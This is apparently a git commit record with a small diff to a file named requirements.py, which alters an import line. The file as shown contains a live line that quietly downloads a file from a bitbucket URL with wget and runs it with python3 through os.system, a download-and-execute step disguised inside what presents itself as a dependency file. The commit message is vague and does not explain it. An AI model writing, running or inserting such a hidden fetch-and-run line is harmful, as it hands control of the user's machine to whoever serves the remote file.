bb92e1aed62b5fb0ab3839c785a3739c38dc4659
gakira munshi <gakimarki@proton.me>
2024-12-20 05:15:19 -0500

    Make that it works in 90% of the cases.  3:30.

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys,lib2to3
+import os, sys,zipfile
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
